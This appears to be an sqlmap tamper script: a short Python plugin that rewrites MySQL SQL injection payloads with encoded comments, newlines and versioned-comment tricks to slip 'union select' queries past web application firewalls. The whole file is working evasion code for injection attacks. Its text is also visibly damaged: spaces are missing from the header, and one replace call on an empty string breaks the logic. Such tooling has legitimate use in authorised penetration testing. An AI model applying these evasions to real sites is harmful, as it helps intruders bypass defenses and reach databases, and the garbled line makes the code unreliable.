"""
Copyright(c)2006-2019sqlmapdevelopers(http://sqlmap.org/)
Seethefile'LICENSE'forcopyingpermission
"""

import os

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST


def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against %s" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))


def tamper(payload, **kwargs):
    # %23a%0aunion/*!44575select*/1,2,3
    if payload:
        payload = payload.replace("union", "%23a%0aunion")
        payload = payload.replace("select", "/*!44575select*/")
        payload = payload.replace("%20", "%23a%0a")
        payload = payload.replace("", "%23a%0a")
        payload = payload.replace("database()", "database%23a%0a()")
    return payload
